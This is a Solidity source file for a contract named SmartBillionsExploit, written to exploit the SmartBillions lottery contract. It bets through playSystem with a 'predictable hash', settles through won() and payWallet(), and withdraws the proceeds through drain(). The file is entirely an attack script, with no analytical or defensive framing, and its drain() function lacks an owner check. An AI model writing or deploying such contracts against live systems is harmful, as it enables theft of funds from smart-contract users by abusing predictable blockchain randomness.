pragma solidity ^0.4.13;

interface ISmartBillions {
    function playSystem(uint _hash, address _partner) external payable returns (uint);
    function won() external;
    function betBlockNumberOf(address _addr) external view returns (uint);
    function betValueOf(address _addr) external view returns (uint);
    function walletBalanceOf(address _addr) external view returns (uint);
    function payWallet() external;
}

contract SmartBillionsExploit {
    ISmartBillions public target;
    address public owner;

    constructor(address _target) public {
        target = ISmartBillions(_target);
        owner = msg.sender;
    }

    function attack(uint luckyHash) external payable {
        require(msg.sender == owner);
        // Send bet to contract using predictable hash
        target.playSystem.value(msg.value)(luckyHash, address(0));
    }

    function settle() external {
        target.won(); // if blockhash still within 256 blocks
        target.payWallet(); // collect wallet balance if any
    }

    function drain() external {
        owner.transfer(address(this).balance);
    }

    function () public payable {}
}

